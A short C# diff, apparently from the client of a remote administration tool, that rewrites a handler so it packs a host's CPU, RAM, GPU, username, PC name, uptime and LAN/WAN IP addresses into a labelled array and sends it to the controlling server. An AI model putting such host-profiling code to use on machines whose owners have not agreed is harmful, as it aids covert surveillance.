@@ -320,7 +320,24 @@ namespace Core.Commands
 		{
 			try
 			{
-				new Core.Packets.ClientPackets.GetSystemInfoResponse(SystemCore.GetCpu(), SystemCore.GetRam(), SystemCore.GetGpu(), SystemCore.GetUsername(), SystemCore.GetPcName(), SystemCore.GetUptime(), SystemCore.GetLanIp(), SystemCore.WANIP).Execute(client);
+				string[] infoCollection = new string[16];
+				infoCollection[0] = "Processor (CPU)";
+				infoCollection[1] = SystemCore.GetCpu();
+				infoCollection[2] = "Memory (RAM)";
+				infoCollection[3] = string.Format("{0} MB", SystemCore.GetRam());
+				infoCollection[4] = "Video Card (GPU)";
+				infoCollection[5] = SystemCore.GetGpu();
+				infoCollection[6] = "Username";
+				infoCollection[7] = SystemCore.GetUsername();
+				infoCollection[8] = "PC Name";
+				infoCollection[9] = SystemCore.GetPcName();
+				infoCollection[10] = "Uptime";
+				infoCollection[11] = SystemCore.GetUptime();
+				infoCollection[12] = "LAN IP Address";
+				infoCollection[13] = SystemCore.GetLanIp();
+				infoCollection[14] = "WAN IP Address";
+				infoCollection[15] = SystemCore.WANIP;
+				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
 			{ }
